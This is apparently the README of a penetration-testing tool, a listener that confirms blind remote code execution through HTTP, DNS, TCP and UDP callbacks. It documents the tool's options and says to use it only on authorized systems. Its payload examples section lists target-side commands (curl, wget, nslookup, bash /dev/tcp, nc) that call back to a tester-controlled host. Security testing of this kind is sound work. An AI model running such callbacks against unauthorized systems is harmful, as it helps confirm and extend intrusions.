# callback_server.py

Multi-protocol callback listener for confirming blind RCE. It is a
verification listener only; it does not exploit anything.

## Features

- HTTP, DNS, raw TCP, and UDP listeners.
- Random token by default, with `--token` and `--require-token` correlation.
- Prints callbacks and appends JSONL events to `data/callbacks_<timestamp>.jsonl`.
- Prints ready-to-use payload examples using `--public-host`.
- DNS returns an A record (`--dns-answer`, default `127.0.0.1`).
- Redacts sensitive HTTP headers (`Authorization`, `Cookie`, etc.).
- `--once` exits after the first logged callback.

## Quick start

```bash
# HTTP only (default), port 8080
python3 callback_server.py

# HTTP + TCP + UDP
python3 callback_server.py --http --tcp --udp --public-host 203.0.113.10

# DNS (root or a high port)
sudo python3 callback_server.py --dns --dns-port 53
python3 callback_server.py --dns --dns-port 5353

# All protocols, exit after first hit
sudo python3 callback_server.py --all --once
```

## Common options

| Option | Meaning |
|---|---|
| `--token TOKEN` | Fixed callback token |
| `--require-token` | Only log callbacks containing the token |
| `--once` | Exit after the first logged callback |
| `--public-host HOST` | Host/IP shown in payload examples |
| `--bind ADDR` | Bind address (default `0.0.0.0`) |
| `--http-port` / `--tcp-port` / `--udp-port` / `--dns-port` | Listener ports |
| `--no-log` | Disable JSONL logging |
| `--log-dir DIR` | Log directory (default `data/`) |
| `--tcp-banner` / `--udp-reply` | Response sent back to the caller |

## Payload examples

The server prints these with the real token and host at startup:

```text
HTTP:  curl -s http://HOST:8080/TOKEN
       wget -qO- http://HOST:8080/TOKEN
DNS:   nslookup TOKEN.HOST HOST
TCP:   bash -c 'echo TOKEN >/dev/tcp/HOST/9999'
       nc HOST 9999
UDP:   echo TOKEN | nc -u HOST 9998
```

## Notes

- DNS/TCP/UDP callbacks may be blocked by firewalls; HTTP is the most reliable.
- Use `--public-host` when the auto-detected address is not reachable from the
  target.
- Only use against systems you own or are authorized to test.
